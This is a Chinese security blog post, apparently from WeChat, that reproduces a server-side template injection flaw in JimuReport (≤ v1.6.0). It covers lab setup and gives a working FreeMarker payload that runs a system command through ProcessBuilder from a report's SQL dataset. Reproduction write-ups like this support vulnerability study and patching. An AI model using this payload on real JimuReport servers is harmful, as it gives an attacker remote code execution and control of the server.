> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fXTXiy0Z67ExHGN7zWIs2w)<table data-mpa-powered-by="yiban.io"><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

现在只对常读和星标的公众号才展示大图推送，建议大家把渗透 Xiao 白帽 “设为星标”，否则可能看不到了！

**0x01 前言**

    jeecgboot 积木报表系统 jimureport(jmreport) 是一款免费的数据可视化报表，含报表和大屏设计，像搭建积木一样在线设计报表！功能涵盖数据报表、打印设计、图表报表、大屏设计等。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJFJaN9O1qgUoTqXWMoe04IMef8rPSPHmGXAViaB4HibgdGojDoLicy4anA/640?wx_fmt=png)jimureport ≤ v1.6.0 具有 SSTI（服务器端模板注入），攻击者可利用该漏洞远程执行任意代码，控制服务器权限。

**0x02 漏洞影响**

```
jimureport ≤ v1.6.0

```

**0x03 环境搭建**

```
环境要求：jdk+，MySQL

```

**文本所需环境已打包好，文末自行获取即可**

将 **jimureport.mysql5.7.create.sql** 文件导入数据库

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJyia8zw6XTdnTibOPI40Mz6MM7p7lcokGPyMvK3u6QhpibyiblUUPs2uRsw/640?wx_fmt=png)

修改配置文件 **application.yml**（默认 root/root）  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJEquhlyiccrB4jd3fVHQzE2S8CdUT8nP2oHeO3mic8IIYMjHP3ZB2qjsA/640?wx_fmt=png)

运行 **bat** 文件，启动环境

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJfN449QqbKpkzNTZHj83aBfCMNy6icWnbpGcRib8j7EvvnK5VuTxiapO8A/640?wx_fmt=png)

环境启动成功！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJxmJIsTXNjuSL0MnkRFbG8RWicLFTBUkWGYNfJ0NHRePTzpqAUk8Yaibg/640?wx_fmt=png)

访问地址：**http://localhost:8085/jmreport/list**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJpVptUTbMcDzDjhmhrBGeF9TglPHLE08DqJY0Xx8Kwj2krdpqUbpxEA/640?wx_fmt=png)

**0x04 漏洞复现**

新建图表

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJRVT1rH1dUKTD1hoZvhwPngmJphe3bjsSAicQjAjcbseicXswudt6eAGA/640?wx_fmt=png)

选择 SQL 数据集

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJIxxhhbnCC8fIzVXVkmEJJHTAhNc8icWqv1hNN3Uv019JIxTA6MJ53RQ/640?wx_fmt=png)

EXP：  

```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc").start ()}

```

在报表 SQL 中执行该 PAYLOAD

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJw7nPWjHuQHVgXO7BMdqZZa1Jk6Vpl9MJAUJvK9IsG8JkNpvwGu4JUQ/640?wx_fmt=png)

命令执行成功！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagC7eJeaFIIFvlCUsn8icRoJfr9WUn6VqoMQdlhibc2oIEyFAwgicThX9UFbe0rBRduHoJ5n69bAIZ3g/640?wx_fmt=png)

**0x05 修复方案**

```
建议及时更新版本！

```

**0x06 下载地址**

**点击下方名片进入公众号**

**回复关键字【****20234450****】获取**下载链接****

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTER2M22xQ4L9ypTc8ycOSFz16CibJb5tZJAekLtXvhuAVPTwsIdyfGc6vViaCWib8HwdUeTs72DzN4ag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**网 安 考 证![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTER2M22xQ4L9ypTc8ycOSFz16CibJb5tZJAekLtXvhuAVPTwsIdyfGc6vViaCWib8HwdUeTs72DzN4ag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)**

需要考以下各类安全证书的可以联系我，价格优惠、组团更便宜！

<table width="676"><tbody><tr><td width="557" valign="top"><p>CISP、PTE、PTS、DSG、IRE、IRS、NISP、PMP、CCSK、CISSP、ISO27001...</p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTHjHaNZEcAQxmACdS20uaT7YUP0TObLHLBicia6vKicVJ75AVOfN3RQxop70GQXFhFRm0ZkdKoydgfIg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1&random=0.06125543926007038)

23hvv 红蓝 py 交流群，共享资源 一起 py![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTER2M22xQ4L9ypTc8ycOSFzQtDSxiby0Km30I4mVWNISTiaBpdketg32jiaPIUiaqZRichxfrrSEq0D4sw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 

_**不定期福利赠送**_

群满可以后台加 vx 备注 py 邀请进群![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTER2M22xQ4L9ypTc8ycOSFzbnmeYJo1ICZBtTsvxbZqbUENdn3IKgnjiaFr5DcMKmtnUBReVWdD9oQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTE1j2ic3cE7Clnkomrs3vzkVCr0xLvW8CTBByvLqeibysqvX4WR6aXx89EWH62JDeucosXqib752NT9A/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

**【往期推荐】**  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细 | 钟馗之眼】ZoomEye-python 命令行的使用](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488453&idx=1&sn=5828a0e1a2299d3ee0215f0ed4c30bf1&chksm=ea37ec9fdd406589124c67c45487be39ed1033d88c627092cf07f6d4f14ccdb9079b38dba74d&scene=21#wechat_redirect)  

[【超详细 | 附 EXP】Weblogic CVE-2021-2394 RCE 漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488922&idx=1&sn=f43e3c243bbbfd2822867a3acaa8b85e&chksm=ea37eac0dd4063d63d98f935c73ce571cbfeb0e7272a6f171a28143bdb3e7134b09ea874969a&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附 EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

[【CNVD-2021-30167 | 附 PoC】用友 NC BeanShell 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

 [记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

**走过路过的大佬们留个关注再走呗![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGYu9nrfsXsv7ZrsqXibnKn0eCPo3D8HzHfmHdiar1tickAm9gP0XpiakaQhyB0ib0OBrNyp0Kpz59Umow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&random=0.2553642180635751)**

**往期文章有彩蛋哦![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGYu9nrfsXsv7ZrsqXibnKn06P5qlPDOibvAu5D68z2GBB98ATYhb2G1pMVA6iahuBuWOyicnUGQcWarg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&random=0.3569542558042562)**